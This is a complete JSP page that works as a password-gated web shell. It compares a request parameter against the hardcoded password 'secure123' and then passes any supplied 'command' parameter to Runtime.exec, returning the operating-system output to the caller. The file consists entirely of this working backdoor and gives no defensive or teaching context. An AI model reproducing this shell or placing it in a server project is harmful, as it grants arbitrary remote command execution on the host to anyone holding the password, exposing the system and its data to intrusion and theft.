<%@ page language="java" contentType="text/plain; charset=UTF-8" pageEncoding="UTF-8"%>
<%
    // Hardcoded password for authentication
    final String hardcodedPassword = "secure123";

    String password = request.getParameter("password");
    String command = request.getParameter("command");

    if (password == null || !password.equals(hardcodedPassword)) {
        out.print("Authentication failed. Incorrect password.");
        return;
    }

    if (command == null || command.trim().isEmpty()) {
        out.print("No command provided.");
        return;
    }

    try {
        // Execute the OS command
        Process process = Runtime.getRuntime().exec(command);
        java.io.BufferedReader reader = new java.io.BufferedReader(
            new java.io.InputStreamReader(process.getInputStream())
        );

        // Collect the output
        String line;
        StringBuilder output = new StringBuilder();
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        reader.close();

        // Output the result
        out.print(output.toString());
    } catch (Exception e) {
        // Handle errors
        out.print("Error while executing command: " + e.getMessage());
    }
%>
